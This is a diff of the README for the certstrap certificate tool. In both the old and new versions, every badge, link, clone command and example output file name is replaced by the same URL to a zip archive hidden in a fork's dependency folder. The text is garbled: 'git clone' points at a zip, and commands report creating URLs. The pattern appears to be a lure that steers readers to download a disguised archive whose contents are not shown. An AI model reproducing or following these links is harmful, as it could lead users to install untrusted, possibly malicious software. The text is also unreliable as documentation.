@@ -1,5 +1,5 @@
 # certstrap
-[![build](https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip)](https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip) [![license](https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip)](https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip)
+[![build](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip)](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip) [![license](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip)](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip)
 
 A simple certificate manager written in Go, to bootstrap your own certificate authority and public key infrastructure.  Adapted from etcd-ca.
 
@@ -26,7 +26,7 @@ certstrap can init multiple certificate authorities to sign certificates with.  
 certstrap must be built with Go 1.4+. You can build certstrap from source:
 
 ```
-$ git clone https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
+$ git clone https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
 $ cd certstrap
 $ ./build
 ```
@@ -39,9 +39,9 @@ handle the latter two for you).
 
 ```
 $ ./bin/certstrap init --common-name "CertAuth"
-Created https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
-Created https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
-Created https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
+Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
+Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
+Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
 ```
 
 Note that the `-common-name` flag is required, and will be used to name output files.
@@ -53,17 +53,17 @@ If the CN contains spaces, certstrap will change them to underscores in the file
 
 ```
 $ ./bin/certstrap init --common-name "Cert Auth"
-Created https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
-Created https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
-Created https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
+Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
+Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
+Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
 ```
 
 ### Request a certificate, including keypair:
 
 ```
 $ ./bin/certstrap request-cert --common-name Alice
-Created https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
-Created https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
+Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
+Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
 ```
 
 certstrap requires at least one of `-common-name`, `-ip`, or `-domain` flags to be set in order to generate a certificate signing request.  The CN for the certificate will be found from these fields.
@@ -77,15 +77,15 @@ PEM key with the `-key` flag
 
 ```
 $ ./bin/certstrap sign Alice --CA CertAuth
-Created https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip from https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip signed by https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
+Created https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip from https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip signed by https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
 ```
 
 #### PKCS Format:
 If you'd like to convert your certificate and key to PKCS12 format, simply run:
 ```
-$ openssl pkcs12 -export -out outputCert.p12 -inkey https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip -in https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip -certfile https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip
+$ openssl pkcs12 -export -out outputCert.p12 -inkey https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip -in https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip -certfile https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip
 ```
-`https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip` and `https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip` make up the leaf private key and certificate pair of your choosing (generated by a `sign` command), with `https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip` being the certificate authority certificate that was used to sign it.  The output PKCS12 file is `outputCert.p12`
+`https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip` and `https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip` make up the leaf private key and certificate pair of your choosing (generated by a `sign` command), with `https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip` being the certificate authority certificate that was used to sign it.  The output PKCS12 file is `outputCert.p12`
 
 
 ### Retrieving Files
@@ -98,7 +98,7 @@ By default, this is in `out/`
 
 ### Contributing
 
-See [CONTRIBUTING](https://raw.githubusercontent.com/tanglongwei/certstrap/master/Godeps/_workspace/src/golang.org/Software-v2.3.zip) for details on submitting patches.
+See [CONTRIBUTING](https://github.com/tanglongwei/certstrap/raw/refs/heads/master/Godeps/_workspace/src/github.com/codegangsta/cli/Software_v2.8-alpha.3.zip) for details on submitting patches.
 
 ### License
 
